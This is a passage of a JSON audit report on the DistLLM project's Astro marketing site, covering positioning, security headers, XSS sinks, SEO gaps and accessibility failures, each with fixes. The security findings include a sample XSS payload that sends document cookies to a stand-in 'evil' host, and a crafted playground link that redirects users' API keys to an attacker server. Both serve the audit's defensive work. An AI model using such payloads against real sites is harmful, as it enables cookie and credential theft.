+   "Only site in the competitive set with an interactive API debugging island: SSE-streaming chat against a real server, temperature/max-token controls, multi-turn, auto-generated curl/python/javascript snippets, shareable URLs (src/pages/playground.astro + src/scripts/playground.ts). Ollama, vLLM, llama.cpp and LocalAI offer nothing comparable on the web; only Petals has a hosted chat, and it is not an API debugger.",
+   "Honest, named-competitor positioning page \u2014 src/pages/comparisons.astro publishes 'DistLLM vs Petals', 'DistLLM vs Modal / RunPod' and a co-opetition-framed 'DistLLM + vLLM' table ('DistLLM schedules across nodes; vLLM serves where it fits best'). None of the five competitors publishes head-to-head comparisons; DistLLM sounds confident rather than defensive.",
+   "Category-defining hero copy that states the unique claim in four words: 'Pool your GPUs.' with subhead about pooling GPUs 'across multiple devices to run models no single machine can handle' \u2014 crisp articulation no competitor needs or offers because none of them do this.",
+   "Differentiated tooling pair competitors lack entirely: InstallCustomizer (role/OS-tailored install commands) and CostCalculator (own-hardware electricity vs cloud-rental TCO). Ollama reduces install to one copyable command; nobody else offers either customization or cost math.",
+   "Strong technical-SEO foundation already in place: JSON-LD SoftwareApplication + WebSite schema, canonical URLs, OG/Twitter cards with generated og-image.png, RSS (rss.xml.ts) + changelog.xml.ts, Plausible analytics, skip-link/a11y affordances \u2014 ahead of llama.cpp and petals.ml web hygiene.",
+   "Genuinely good dark-terminal aesthetic (near-black #060907, emerald accent, Fraunces/Inter/JetBrains Mono) that reads 'engineered' to the target audience, plus real information architecture: 17-doc collection with sidebar grouping, TOC scroll-spy, glossary, learn hub, use-cases \u2014 more navigable than llama.cpp's README and petals.ml's minimal site."
+  ]
+ },
+ {
+  "dimension": "Security audit of website-astro (the site itself, not the product)",
+  "issues": [
+   {
+    "effort_hours": 1.5,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\pages\\changelog\\index.astro:48 renders `<Fragment set:html={entry.body} />`. In Astro content collections `entry.body` is the RAW markdown source string, not rendered HTML. Verified live against the preview: `curl -s http://localhost:4321/changelog/ | grep -oE '\\*\\*[^*]+\\*\\*'` returns literal `**disable**` \u2014 markdown formatting is broken AND any raw HTML in the .md source is injected verbatim into the DOM with zero sanitization. Every other collection path does this correctly (docs/[...slug].astro:14 and blog/[...slug].astro:12 both use `await render(entry)` + `<Content />`). Because the site ships NO CSP (see separate finding), there is no backstop: a single changelog entry pasted from external release notes or touched by a compromised tool/CI step containing e.g. `<img src=x onerror=fetch('//evil?c='+document.cookie)>` executes on https://distllm.dev/changelog.",
+    "fix": "In changelog/index.astro replace the frontmatter body usage with the compiled component: `const { Content } = await render(entry);` per entry (or map with Promise.all), then `<Content />` inside the prose-doc div instead of `<Fragment set:html={entry.body} />`. This fixes the visible raw-markdown regression on /changelog/ and removes the injection sink in one change.",
+    "severity": "High",
+    "title": "Changelog index injects raw markdown source as unsanitized HTML via set:html (confirmed live rendering bug + XSS surface)"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "`curl -sI http://localhost:4321/` returns only Vary/Content-Type/Cache-Control/Etag \u2014 no Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options, no Referrer-Policy, no Strict-Transport-Security. Production config D:\\distributed-llm\\website-astro\\netlify.toml defines exactly ONE [[headers]] block (Cache-Control for /_astro/*); astro.config.mjs adds none. Concrete exploit chains this enables: (1) clickjacking of the playground Send button via transparent iframe; (2) Referrer leakage \u2014 the Share button (playground.ts:239-254) bakes `?base=<host>` into the URL, so a user arriving via such a link leaks that host to github.com/pypi.org when clicking outbound links, since no Referrer-Policy restricts it; (3) no script-src restriction means every XSS sink found in this audit executes unrestricted. Note: a strict connect-src will conflict with the playground's user-configured arbitrary base URLs \u2014 allowlist `'self' http://localhost:* http://127.0.0.1:*` plus document the constraint, or keep connect-src permissive while locking script-src/style-src/frame-ancestors/object-src.",
+    "fix": "Add a `_headers` file (or netlify.toml blocks) with: Content-Security-Policy `default-src 'self'; script-src 'self' https://plausible.io; style-src 'self'; img-src 'self' data:; connect-src 'self' http://localhost:* http://127.0.0.1:*; frame-ancestors 'none'; object-src 'none'; base-uri 'self'` (verified feasible: zero inline style= attributes in src/, all scripts are bundled except Plausible); Referrer-Policy `strict-origin-when-cross-origin`; X-Content-Type-Options `nosniff`; X-Frame-Options `DENY`; Strict-Transport-Security `max-age=63072000; includeSubDomains`. Also strip `?base/?model/...` params from the URL after hydration (history.replaceState already used in hydrateFromUrl) so shared-state doesn't sit in the address bar/referrer.",
+    "severity": "High",
+    "title": "Zero security headers in dev, preview, and production config (no CSP, no XFO, no nosniff, no Referrer-Policy, no HSTS)"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\scripts\\playground.ts:50 `if (q.has(\"base\")) { state.baseUrl = q.get(\"base\")!; }` \u2014 no scheme/host validation. headers() (line 87) attaches `Authorization: Bearer ${state.apiKey}` to every request, and send() fetches `${state.baseUrl}/v1/chat/completions` (line 156). Attack: share `https://distllm.dev/playground?base=https%3A%2F%2Fevil.example` (framed as 'try my demo cluster'); victim opens it, the Base URL field is silently prefilled inside a collapsed <details>, victim pastes their API key and clicks Send \u2014 key + prompt contents go to the attacker's server. Amplifier: send() persists the value, `localStorage.setItem(\"pg-base-url\", state.baseUrl)` (line 141), and line 25 reuses it on every future visit, so one click poisons later sessions too. The error message at lines 224-229 even coaches users toward typing keys for arbitrary hosts.",
+    "fix": "In hydrateFromUrl validate the param: parse with `new URL(v)`, require protocol http/https, show a persistent warning banner ('Requests will go to <non-localhost host> \u2014 not your machine') whenever the host is not localhost/127.0.0.1/*.lan; do not persist non-local bases to localStorage; clear the base param from the URL after first successful send. Consider defaulting the prefilled field to localhost always, requiring an explicit user edit to target anything else.",
+    "severity": "Medium",
+    "title": "Playground ?base= URL parameter redirects the Authorization header to an attacker-chosen host (API-key exfiltration vector)"
+   },
+   {
+    "effort_hours": 0.5,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\layouts\\BaseLayout.astro:47 `{jsonLdArray.map((obj) => (<script type=\"application/ld+json\" set:html={JSON.stringify(obj)} />))}` lacks the recommended `.replace(/</g, '\\\\u003c')` escaping. Today jsonLd is only passed by index.astro:17 with hand-written constants (grep confirms no other callers), so nothing user-influenced reaches it. But the prop interface accepts arbitrary Record<string, unknown>, and the moment someone wires frontmatter titles/descriptions into JSON-LD (a common follow-up), a title containing `</script><script>\u2026` becomes stored XSS in every layout head. Astro documents exactly this escaping requirement for set:html inside script tags.",
+    "fix": "One-line hardening in BaseLayout.astro: `set:html={JSON.stringify(obj).replace(/</g, \"\\\\u003c\")}`. Optionally add a build-time assertion that jsonLd values contain no '<'.",
+    "severity": "Low",
+    "title": "JSON-LD injected via set:html without < escaping (latent script-context breakout)"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\layouts\\DocsLayout.astro:150 `excerptEl.innerHTML = r.excerpt; // build-generated markup from our own index`. Pagefind excerpts are static build artifacts derived from indexed docs content; exploiting this requires compromising the build/index (at which point the attacker could edit pages directly), so it is defense-in-depth rather than a direct vector today \u2014 but the surrounding code is otherwise exemplary (title uses textContent at line 147 with an explicit comment, result URLs assigned via property). With a future community-contributions workflow for docs, or a supply-chain incident in the `pagefind` npm package (devDependency ^1.5.2), this sink turns live. Same-origin trust also covers `a.href = r.url` (line 143): a javascript: URL planted in the index would execute on click.",
+    "fix": "Either run r.excerpt through DOMPurify.sanitize() (small island-side dependency) before assignment, or parse it safely: set excerptEl.textContent = excerpt.replace(/<\\/?mark>/g, '') and lose highlighting, or build the <mark> spans manually by splitting on the tags. Additionally force `a.rel = \"noopener\"` and reject hrefs not starting with '/' before assigning.",
+    "severity": "Low",
+    "title": "Pagefind search excerpt assigned via innerHTML (acceptable today, fragile under threat-model drift)"
+   },
+   {
+    "effort_hours": 0.1,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\pages\\playground.astro:30 `<input data-pg=\"apiKey\" type=\"password\" placeholder=\"your-api-key\" ...>` \u2014 correct element type and the value is never persisted (grep confirms the only localStorage key site-wide is `pg-base-url`, playground.ts:25/141). However, with no autocomplete attribute, Chrome/Safari will offer 'Save password' for distllm.dev when the form is submitted via the Send button; users who accept store a DistLLM API key in the browser's password vault keyed to the MARKETING domain \u2014 recoverable by any future XSS on the site via injected credential-form probing, and confusingly shared with any real site logins. There are no other forms on the site (grep for <form returns nothing).",
+    "fix": "Add `autocomplete=\"off\"` (or `autocomplete=\"new-password\"`, which suppresses save prompts more reliably) to the apiKey input. One attribute, closes the password-manager prompt.",
+    "severity": "Low",
+    "title": "Playground API-key input lacks autocomplete suppression \u2014 browsers may offer to save the key as a site password"
+   },
+   {
+    "effort_hours": 0.2,
+    "evidence": "Two files exist at repo root of the site: D:\\distributed-llm\\website-astro\\og_dark.txt contains exactly `dark OG written: (1200, 630)` and og_gen4.txt contains `OG regenerated: (1200, 630)` \u2014 console.log redirected to files by the og-image generation script. No secrets exposed (secrets grep over src/ and public/ returned only documentation placeholders like `your-shared-secret` and k8s secretKeyRef references; no sk-, AKIA, ghp_, PEM blocks). Not a vulnerability, just hygiene: stray artifacts in the published repo confuse auditors and scanners.",
+    "fix": "Delete og_dark.txt and og_gen4.txt and add them (plus *.txt log patterns from the OG generator) to .gitignore; fix the generator script to write its confirmation to stdout instead of a file.",
+    "severity": "Low",
+    "title": "Stray generator-log artifacts committed at site root (og_dark.txt, og_gen4.txt)"
+   }
+  ],
+  "opportunities": [
+   "Add an SRI/hash pinning note or upgrade-intent comment for Plausible: script-src already pins the host, but consider self-hosting plausible-script (npm @plausible-analytics/analytics) so CSP can drop the https://plausible.io exception entirely and remove the last third-party script trust anchor",
+   "Add a lightweight CI gate (.github workflow) running `npm audit --audit-level=moderate` and `npm run check` for the website-astro directory \u2014 the site currently has zero automated checks, so header regressions or new sinks would land silently",
+   "Consider adding a DOMPurify-based `safeHtml()` helper module used by BOTH the Pagefind excerpt renderer and any future set:html call sites, so the safe pattern is one import away when contributors add dynamic markup",
+   "Add a security.txt (/.well-known/security.txt) pointing to the project's advisory channel \u2014 cheap credibility signal for a site whose product pitch is security-sensitive distributed inference",
+   "When fixing the changelog set:html bug, add an eslint/no-restricted-syntax (or astro-check rule) banning `set:html` outside an allowlist, preventing reintroduction as content contributors multiply"
+  ],
+  "score_0_10": 6,
+  "strengths": [
+   "Disciplined DOM writing across the entire island layer: playground.ts renders SSE deltas via output.textContent += delta (line 205), all three code snippets via el.textContent (lines 97-123) with the real API key masked as sk-\u2026 so secrets never appear in generated snippets, status via textContent, model datalist built with createElement/option.value (lines 330-334) \u2014 the single innerHTML use there is the harmless clearing idiom list.innerHTML = \"\"",
+   "TerminalDemo.astro and InstallCustomizer.astro likewise use textContent exclusively; no eval/new Function/document.write anywhere in src/",
+   "All three target=\"_blank\" occurrences carry rel=\"noopener noreferrer\" (Header.astro:38, blog/index.astro:44, community.astro:26 and :50) \u2014 fully clean",
+   "API key handling is conservative: type=\"password\", kept only in JS memory, never written to localStorage/sessionStorage/cookies; the sole persisted item is the non-secret pg-base-url",
+   "Supply chain is clean: npm audit reports 0 vulnerabilities across 555 dependencies (341 prod); dependency set is minimal (astro, tailwindcss, fontsource, mdx/rss/sitemap); the only third-party runtime script is Plausible loaded PROD-only over HTTPS (BaseLayout.astro:51); no sourcemaps shipped in dist/",
+   "Docs and blog detail routes use the safe compiled-render path (render(entry) + <Content />), and RSS feeds go through @astrojs/rss which XML-escapes by default"
+  ]
+ },
+ {
+  "dimension": "SEO & Content Quality",
+  "issues": [
+   {
+    "effort_hours": 16,
+    "evidence": "http://localhost:4321/benchmarks/ renders 'Measured, not promised' and 'Every number below is produced by the built-in benchmark suite against consumer hardware \u2014 rerun it yourself', plus a fabricated Methodology section ('512-token prompts, 256 generated tokens, greedy decoding unless stated') \u2014 yet the numbers (TinyStories-1M 142 tok/s ... Llama-3.1-70B 3.9 tok/s on 6x RTX 3090) are placeholders per project context, not measurements. Source: D:\\distributed-llm\\website-astro\\src\\pages\\benchmarks.astro.",
+    "fix": "Either run the actual built-in benchmark suite and replace every number with recorded output (commit the raw logs), or relabel the page honestly as 'Projected performance' with the methodology marked illustrative until real runs land. Never ship invented data under a 'Measured, not promised' headline \u2014 one skeptical reader with an RTX 3090 can falsify it publicly.",
+    "severity": "Critical",
+    "title": "Benchmarks page publishes PLACEHOLDER numbers presented as measured results"
+   },
+   {
+    "effort_hours": 3,
+    "evidence": "curl heading scan: /benchmarks/ => NO H1 (first heading is '<h2 class=\"mt-4 text-4xl\">Measured, not promised'), same pattern verified on /blog/, /changelog/, /community/, /comparisons/, /glossary/, /integrations/, /learn/, /playground/, /security/, /use-cases/. Only /, /docs/, /privacy/, /terms/, doc posts and doc detail pages have h1.",
+    "fix": "In each marketing page (src/pages/benchmarks.astro etc.) promote the hero element from h2 to h1 (or pass a pageTitle into PageLayout that renders an h1). Keep visual styling identical by moving the text-4xl class onto the h1. This is the single highest-leverage on-page SEO fix in the repo.",
+    "severity": "Critical",
+    "title": "12 of ~20 pages have no H1 \u2014 hero headings are semantically H2"
+   },
+   {
+    "effort_hours": 12,
+    "evidence": "grep across website-astro/src: 0 hits for 'run LLM locally'/'run locally', 0 for 'local LLM', 0 for 'homelab/home lab', 0 for LocalAI. Titles are 7-29 chars: homepage is just 'DistLLM'; section pages are 'Benchmarks \u00b7 DistLLM', 'Comparisons \u00b7 DistLLM', 'Use Cases \u00b7 DistLLM'. Homepage h1 'Pool your GPUs. Run 70B models.' covers pool-GPUs well but nothing on the site captures 'run LLM locally', 'local LLM server', or 'ollama alternative' phrasing.",
+    "fix": "Rewrite titles to 50-60 chars carrying the query: home -> 'DistLLM \u2014 Run LLMs Locally Across Your Own Devices'; benchmarks -> 'DistLLM Benchmarks: LLM Throughput on Consumer GPUs'; comparisons -> 'DistLLM vs Ollama, vLLM & Petals Compared'. Add a 'Run local LLMs on hardware you already own' line to the hero subcopy, and a 'Local LLM' / homelab angle on use-cases.",
+    "severity": "High",
+    "title": "Head search queries untargeted: zero mentions of 'local LLM' or 'run LLM locally'; titles waste SERP space"
+   },
+   {
+    "effort_hours": 6,
+    "evidence": "Rendered /comparisons/ (329 words total) contains only 'DistLLM vs Petals', 'DistLLM vs Modal / RunPod', 'DistLLM + vLLM'. Meta description: 'How DistLLM compares with Petals, cloud GPU platforms, and vLLM.' Ollama appears nowhere on the page; site-wide it occurs only once, in src/content/docs/integrations-docs.mdx lines 24-25 ('Ollama-compatible module'), even though the homepage FAQ asks 'How is this different from vLLM or llama.cpp?'",
+    "fix": "Add 'DistLLM vs Ollama' and 'DistLLM vs llama.cpp' tables to src/pages/comparisons.astro (single-machine vs pooled-cluster framing, GGUF support, LAN pooling) \u2014 this is the highest-volume competitor query for the product category. Update the meta description to name Ollama.",
+    "severity": "High",
+    "title": "Comparisons page skips Ollama entirely \u2014 the highest-volume competitor query"
+   },
+   {
+    "effort_hours": 24,
+    "evidence": "wc -w on src/content/docs/*.mdx: 93-212 words per file, 2,284 total including frontmatter; prose-only counts drop to 27-134 words after code blocks (multi-node.mdx 27, embeddings.mdx 29, installation.mdx 43). grep '](/': exactly ONE internal markdown link in the whole collection; src/pages/docs/[...slug].astro has no prev/next, related-links, or breadcrumb logic.",
+    "fix": "Per page add a 100-200 word conceptual intro, prerequisites, troubleshooting, and 'Next steps' links to 2-3 related docs; wire prev/next from the existing group/order fields in src/content.config.ts into [...slug].astro. Prioritize installation, quick-start, multi-node, chat-completions. Target 400+ prose words per page over time.",
+    "severity": "High",
+    "title": "Docs corpus is extremely thin and has no internal linking"
+   },
+   {
+    "effort_hours": 6,
+    "evidence": "curl count of application/ld+json blocks: / => 2, every other page tested (/benchmarks/, /docs/, /docs/quick-start/, /blog/, /blog/pooling-consumer-gpus/, /comparisons/, /use-cases/, /glossary/, /changelog/v0-4-0/) => 0. Blog posts render no Article schema (no headline/datePublished/author); homepage has an FAQ section (src/pages/index.astro id=\"faq\", items from src/data/features.ts) with no matching FAQPage schema.",
+    "fix": "In PageLayout/blog [...slug].astro add Article (or TechArticle/BlogPosting) JSON-LD from post.data (pubDate, author default 'DistLLM Team', title, description); add BreadcrumbList to docs detail pages; emit FAQPage JSON-LD next to the FaqAccordion using the same FAQ array.",
+    "severity": "High",
+    "title": "JSON-LD exists only on the homepage \u2014 no Article, BreadcrumbList, or FAQPage schema"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "src/content/changelog/ contains only v0-2-0.md, v0-3-0.md, v0-4-0.md, while homepage badge says 'v0.4.1 \u2014 now on pip install distributed-llm' and blog post 'v0.4.1 \u2014 PyPI Release' exists. /changelog.xml channel description: 'Every DistLLM release.' \u2014 its newest item is v0.4.0.",
+    "fix": "Add src/content/changelog/v0-4-1.md (version: 0.4.1, highlights from the PyPI release) so /changelog/, changelog.xml, and the sitemap reflect the shipped version. Consider generating the entry from package metadata in CI to prevent future drift.",
+    "severity": "Medium",
+    "title": "Changelog stale: site advertises v0.4.1 but changelog collection and feed stop at v0.4.0"
+   },
+   {
+    "effort_hours": 4,
+    "evidence": "src/content/blog/v0-4-0-production-readiness.md (54 words) and v0-4-1-pypi-release.md (56 words) both carry linkOut frontmatter; getStaticPaths in src/pages/blog/[...slug].astro excludes them so they have no local page (confirmed: /blog/v0-4-1-pypi-release/ returns 404), yet rss.xml.ts lists them with link=post.data.linkOut and guid isPermaLink=\"true\" pointing to pypi.org/github.com URLs.",
+    "fix": "Write real release notes on-site (150+ words each) and keep linkOut only as a 'View on GitHub' button, so the pages exist for search/social and stay in the sitemap; or exclude linkOut items from rss.xml.ts. Substantive posts are also short: distllm-vs-cloud-costs.md 460 words, pooling-consumer-gpus.mdx 526 words \u2014 expand toward 900-1200 with internal links to /docs/multi-node/ and benchmarks.",
+    "severity": "Medium",
+    "title": "Two of four blog posts are 50-word outbound-link stubs that dilute the blog index and RSS"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "Fetched http://localhost:4321/rss.xml and /changelog.xml: neither has <atom:link rel=\"self\" type=\"application/rss+xml\" ...>, <language>, or <lastBuildDate>. W3C feed validator would flag these. rss.xml.ts/changelog.xml.ts pass only title/description/site/items.",
+    "fix": "Pass customData or extend both feeds in src/pages/rss.xml.ts and changelog.xml.ts: add language 'en', lastBuildDate (newest pubDate), and the atom:link self namespace. Low effort, removes validator warnings and improves feed-client display.",
+    "severity": "Medium",
+    "title": "RSS feeds miss basic channel elements (language, atom:self, lastBuildDate)"
+   },
+   {
+    "effort_hours": 8,
+    "evidence": "Rendered-text word counts: /learn/ => 182, /community/ => 189. /learn/ is seven link-cards into docs ('Install, start a coordinator... Start \u2192'); /community/ is contribution pointers. Titles 'Learn \u00b7 DistLLM' and 'Community \u00b7 DistLLM' target nothing.",
+    "fix": "Give /learn/ unique value: 2-3 sentence abstract + difficulty/outcome per track, plus a 'How distributed inference works' primer targeting informational queries (pipeline parallelism explainer already half-exists in glossary). Fold /community/ into fewer words or enrich with contributor guide, showcase list, and roadmap.",
+    "severity": "Medium",
+    "title": "/learn/ and /community/ are near-empty hub pages (182 and 189 words)"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "Curling http://localhost:4321/benchmarks (no slash) returns an HTML page titled 'Redirecting to: /benchmarks/' containing <meta name=\"robots\" content=\"noindex\"> \u2014 Astro static-output redirect pages, not HTTP 301s (netlify.toml has build/publish/asset headers only; no Netlify adapter installed). Applies to all 21 astro.config.mjs redirects plus trailing-slash variants not covered by host defaults.",
+    "fix": "Add @astrojs/netlify adapter or a public/_redirects file so legacy URLs return 301 at the edge; alternatively confirm Netlify's automatic pretty-URL redirects cover the trailing-slash cases and keep HTML pages only for the .html legacy paths.",
+    "severity": "Medium",
+    "title": "Legacy .html redirects ship as meta-refresh noindex pages, not 301s"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "Heading scan of /docs/: sequence starts h3, then h1 \u2014 the only ordering violation found (all other pages had no level skips). Cause: card titles at src/pages/docs/index.astro line 49 are <h3 class=\"font-semibold...\"> and a nav/group block precedes the main heading in DOM order.",
+    "fix": "Demote pre-content group labels to non-heading elements (div/p) or reorder markup so the h1 comes first; keep card titles at h2/h3 relative to their section heading.",
+    "severity": "Low",
+    "title": "Docs index renders an H3 before the H1"
+   },
+   {
+    "effort_hours": 4,
+    "evidence": "Rendered /glossary/ is 410 words across 16 term headings (~25 words per entry, e.g. 'Pipeline Parallelism Core: Splits model layers across devices...' stops there). Zero links from any term to its deep-dive doc (docs/architecture/, docs/performance-tuning/).",
+    "fix": "For each term add 2-3 sentences (when to use, trade-offs) plus a 'Read more in docs/...' link \u2014 cheap internal-linking mesh that also gives the glossary standalone ranking value for definitional queries.",
+    "severity": "Low",
+    "title": "Glossary entries are one-liners with no links into docs"
+   }
+  ],
+  "opportunities": [
+   "Own the comparison SERPs: dedicated sections (or child pages) 'DistLLM vs Ollama', 'vs llama.cpp', 'vs LocalAI' alongside existing Petals/vLLM tables \u2014 currently zero coverage of the two highest-volume rivals",
+   "Publish CI-run benchmark results (JSON artifact consumed by benchmarks.astro) so numbers are reproducible-by-build and the 'rerun it yourself' claim becomes true; add llama.cpp/Ollama single-node baseline columns",
+   "Target long-tail cluster around the core job: 'run LLM across multiple computers', 'pool GPUs from multiple machines', 'run 70B model without a datacenter GPU', 'private ChatGPT alternative on home hardware' \u2014 one focused guide post each feeding docs",
+   "Expand the strongest existing assets: pooling-consumer-gpus.mdx and distllm-vs-cloud-costs.md are good skeletons; deepen to 1k+ words with charts, cost table linked to the calculator, and internal links to docs and benchmarks",
+   "Add Article/BreadcrumbList/FAQPage JSON-LD for rich-result eligibility (FAQ answers already written in src/data/features.ts \u2014 pure win)",
+   "Turn the changelog into an SEO surface: version entries with keyword-rich highlight prose (currently one-line lists), which ranks for '<feature> distllm' long-tail over time"
+  ],
+  "score_0_10": 4.5,
+  "strengths": [
+   "Per-page metadata hygiene is excellent: every indexed page has a unique title, hand-written meta description, correct self-referencing canonical (https://distllm.dev), and full OG + Twitter card set (og:type article on posts, twitter:card summary_large_image); verified via curl on all ~20 routes",
+   "Sitemap is exactly complete: all 37 rendered content routes present, with /404, rss.xml, and changelog.xml correctly excluded; robots.txt references sitemap-index.xml; 404s return true HTTP 404 status with noindex",
+   "Homepage structured data is solid: SoftwareApplication (Offer price 0 USD, Apache-2.0 license) + WebSite JSON-LD, and the h1 'Pool your GPUs. Run 70B models.' directly targets the core differentiator query",
+   "Real 1200x630 og-image.png ships in public/ and dist/ (verified PNG header), referenced consistently from og:image and twitter:image",
+   "Heading hierarchy is clean where h1s exist: no skipped levels on any scanned page, doc articles have proper h1->h2->h3 with anchor ids for the TOC scroll-spy",
+   "Both RSS feeds (rss.xml, changelog.xml) are structurally valid with RFC-822 dates, draft filtering (!data.draft in rss.xml.ts), and the changelog feed carries per-version highlights",
+   "Thoughtful redirect map in astro.config.mjs covering 15 legacy .html URLs plus vanity paths (/enterprise, /tutorials, /feed.xml), and netlify.toml sets immutable caching on hashed /_astro/* assets"
+  ]
+ },
+ {
+  "dimension": "UX & Accessibility",
+  "issues": [
+   {
+    "effort_hours": 3,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\layouts\\DocsLayout.astro line 22: `<aside class=\"hidden lg:block\">`. Below lg (1024px) \u2014 every phone and iPad-portrait (768/820px) \u2014 the entire docs sidebar (Pagefind search input, 'Browse' group links, current-group page list, aria-label=\"Docs\" nav) is display:none and removed from the a11y tree/tab order with NO alternative rendering. The TOC aside is likewise `hidden xl:block` (line 101), so nothing under 1280px gets the TOC either. Rendered HTML confirms it ships this way. What remains on mobile for a 17-page/6-group doc tree (src/config/docs-nav.ts): the header 'Docs' link back to the hub, footer links, and linear prev/next pagination ('\u2190 prev | next \u2192', DocsLayout lines 90-97). There is no way to see where you are in the docs, jump sections, or search on mobile.",
+    "fix": "Render a second, mobile-only copy of the nav: a `<details class=\"lg:hidden\">` disclosure above the article (same pattern Header.astro already uses for its mobile menu) containing the group links + current-group items, plus the search input moved outside the hidden aside (or duplicated with lg:hidden). Optionally add a sticky top progress/breadcrumb showing group \u203a page. Reuse DOCS_NAV as-is; ~40 lines of Astro.",
+    "severity": "High",
+    "title": "Docs navigation completely absent on mobile/tablet \u2014 sidebar is hidden lg:block with no fallback"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "--color-brand-600 is emerald-400 #34d399 (global.css line 38) with luminance L\u22480.496; white-on-it = (1.05)/(0.546) \u2248 1.92:1 vs the 4.5:1 AA requirement (fails even the 3:1 large-text bar). Occurrences: Header.astro line 45 (`bg-brand-600 px-3.5 py-2 ... text-white` 'Get Started' \u2014 on EVERY page), src/pages/playground.astro line 79 ('Send request' primary action), FeatureTabs.astro line 18 (active capability pill `bg-brand-600 text-white`). Ironically Button.astro gets it right (`bg-brand-500 text-[#04140d]` \u2248 7.45:1 AAA) \u2014 these three components deviate from the accessible pattern.",
+    "fix": "Apply the Button pattern: dark ink text on the emerald fill (`text-[#04140d]` or `text-bg`) in all three spots, or route them through the Button component. Zero visual-design cost \u2014 light-on-dark text fits the terminal theme better than white.",
+    "severity": "High",
+    "title": "White text on emerald brand-600 buttons fails WCAG contrast at 1.92:1"
+   },
+   {
+    "effort_hours": 0.5,
+    "evidence": "src/components/CostCalculator.astro lines 8-23: each slider is `<div><span>Requests per day \u2026</span><input type=\"range\" \u2026></div>` \u2014 the span is a plain sibling inside a div, there is no wrapping `<label>` and no for/id, so screen readers announce two unnamed sliders ('slider, 1000'). Contrast with playground.astro lines 52-64 where the identical slider pattern IS correctly wrapped in `<label>`. The live value spans (reqVal/tokVal) are also not associated (no aria-describedby / output element).",
+    "fix": "Wrap each control in `<label>` exactly as playground.astro does (label-as-wrapper associates automatically), or add for/id pairs plus `<output>` for the values. 10-minute fix, two inputs.",
+    "severity": "High",
+    "title": "Cost calculator range inputs have no programmatic labels (unlabeled sliders)"
+   },
+   {
+    "effort_hours": 4,
+    "evidence": "Three components emit tab roles but implement click-only switching: InstallTabs.astro (lines 9-22, role=tablist/tab + role=tabpanel), FeatureTabs.astro (lines 9-28, same), playground.astro snippet switcher (line 115-125: role=tablist/tab but the snippet `<pre>` has NO role=tabpanel, no aria-controls anywhere). None have: arrow-key navigation, Home/End, roving tabindex (all tabs stay in tab order), id/aria-controls linkage, or aria-labelledby on panels \u2014 i.e., they advertise the ARIA tabs contract then break it. Screen-reader users are told 'tab, selected' and will press Arrow keys expecting switching that never happens; sighted keyboard users must Tab through every tab.",
+    "fix": "Either (a) implement the full APG pattern once as a small shared script (roving tabindex, ArrowLeft/Right/Home/End, aria-controls/id wiring) reused by all three, or (b) simpler: drop the tab roles and style them as toggle buttons with aria-pressed, letting panels be plain regions. Option (b) is ~30 min across the three files.",
+    "severity": "High",
+    "title": "All three tab widgets violate the ARIA tabs pattern \u2014 roles promised, keyboard behavior missing"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "Computed per WCAG relative-luminance: #66816f on page bg #060907 = 4.70:1 (passes), on surface #0c110e = 4.48:1 (FAILS 4.5:1), on sunken #111814 = 4.24:1 (FAILS). These combos ship at text-xs (12.8px, far below large-text threshold) in: playground.astro form labels ('Base URL', 'API key\u2026' \u2014 bg-surface card), InstallCustomizer.astro labels + bottom hint (bg-surface), CostCalculator.astro stat captions ('per month (A100 @ ~$1.90/hr)' on bg-sunken tiles) and disclaimer, BarChart.astro unitLabel/r.sub (bg-surface), Footer.astro copyright + 'Apache-2.0 License' (footer is bg-sunken \u2192 4.24:1), DocsLayout.astro search placeholder + results-panel excerpts (panel is bg-surface). By contrast muted #9db3a6 is comfortable everywhere (8.98:1 on bg, 8.56:1 on surface).",
+    "fix": "Lighten --color-faint to \u2248#75907f (computes to ~5.1:1 on sunken, 5.5:1 on surface) in global.css line 28 \u2014 one-line fix that lifts every instance. If the dimmer tone is wanted for decoration, keep old faint strictly for non-text/decorative uses.",
+    "severity": "Medium",
+    "title": "faint token #66816f drops below 4.5:1 on card surfaces \u2014 and it carries form labels and legal text"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "`grep aria-live` over website-astro/src returns zero hits. Affected flows: (1) playground.ts setStatus() swaps '[data-pg=status]' text ('streaming\u2026 N chunks', 'HTTP 500', 'error', 'done \u2014 N chunks') and streams tokens into [data-pg=output] with no live region \u2014 a screen-reader user pressing Send hears nothing until they hunt for changes; (2) BaseLayout.astro delegated copy handler (line 72) mutates btn.textContent='Copied!' \u2014 invisible non-visually; same in share()/copyOut (playground.ts) and InstallCustomizer copy buttons; (3) CostCalculator verdict sentence rewrites on every slider tick; (4) DocsLayout Pagefind panel injects results/'No results.' div with no role=\"status\".",
+    "fix": "Add aria-live=\"polite\" (or role=\"status\") to [data-pg=status], [data-pg=output], the cost-calc verdict, and the Pagefind results panel; give copy buttons a visually-hidden aria-live span announcing 'Copied'. For streaming output consider aria-live off + a 'response complete' announcement to avoid per-token chatter.",
+    "severity": "Medium",
+    "title": "Zero aria-live regions \u2014 async status, streaming output, copy feedback and search results are silent to screen readers"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "`grep focus-visible|outline-none` across src matches exactly one line: DocsLayout.astro line 31 `focus:border-brand-400 focus:outline-none` \u2014 the 1px border changing #1e2b23\u2192emerald is the sole focus cue on the docs search field, a subtle color-only change most auditors flag under 2.4.7/2.4.13. Every other link/button/select relies on the browser default outline (which survives \u2014 no global reset exists, so this passes baseline 2.4.7 \u2014 but looks unstyled/inconsistent on the heavily-designed dark UI). The skip link is the only custom-styled focus state.",
+    "fix": "Add to @layer base in global.css: `:focus-visible { outline: 2px solid var(--color-brand-400); outline-offset: 2px; border-radius: inherit; }` and delete the focus:outline-none from the search input (keep focus:border if desired). One rule fixes the entire site.",
+    "severity": "Medium",
+    "title": "No focus-visible system; the only custom focus style removes the outline for a subtle border-color change"
+   },
